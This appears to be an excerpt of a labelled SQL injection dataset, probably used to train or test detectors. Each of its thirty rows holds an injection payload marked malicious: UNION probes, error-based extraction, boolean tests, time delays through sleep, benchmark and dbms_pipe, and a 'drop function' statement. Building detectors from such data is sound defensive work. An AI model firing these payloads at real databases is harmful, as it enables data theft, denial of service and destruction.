row_index,payload_norm,label,sqli_type_hint
7980,"-4802 union all select 7381,7381,7381,7381,7381,7381,7381,7381,7381,7381--",1,
7981,1' ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'uwbt' like 'uwbt,1,
7982,select ( case when ( 4994 = 1572 ) then 4994 else 4994* ( select 4994 from mysql.db ) end ) #,1,
7983,-2784 ) where 5261 = 5261 or 3472 = 1728#,1,
7984,"1"" ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( ""fqap"" like ""fqap",1,
7985,"1"" ) rlike sleep ( 5 ) and ( ""rfsd"" = ""rfsd",1,
7986,1'|| ( select 'xmoq' from dual where 8047 = 8047 and 7533 = 7533 ) ||',1,
7987,1%' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( '%' = ',1,
7988,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ""uhvy"" = ""uhvy",1,
7989,1 and ( 1977 = 6852 ) *6852-- clxl,1,
7990,"1' ) as xhmm where 8092 = 8092 union all select null,null,null--",1,
7991,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) -- ygbf",1,
7992,"-5989%"" union all select 3581,3581,3581,3581,3581--",1,
7993,"1"" and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
7994,"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",1,
7995,1' ) order by 1#,1,
7996,if ( 6624 = 4232 ) select 6624 else drop function xyyt--,1,
7997,"1' where 7190 = 7190 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
7998,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ""vqpx"" like ""vqpx",1,
7999,"1'|| ( select 'mjkz' where 9430 = 9430 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) ) ||'",1,
8000,"1'+ ( select blbd where 7451 = 7451 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) +'",1,
8001,select sleep ( 5 ) and ( ( ( 'klma' = 'klma,1,
8002,"1 ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 3038 = 3038",1,
8003,"1' ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'rvwk' = 'rvwk",1,
8004,"1 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
8005,"1'|| ( select 'scqw' where 3337 = 3337 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,
8006,1' where 6003 = 6003 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,1,
8007,"1'|| ( select 'ttyt' where 3751 = 3751 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
8008,-4001' ) ) or 5634 = 4044--,1,
8009,"1%"" ) ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ( ""%"" = """,1,
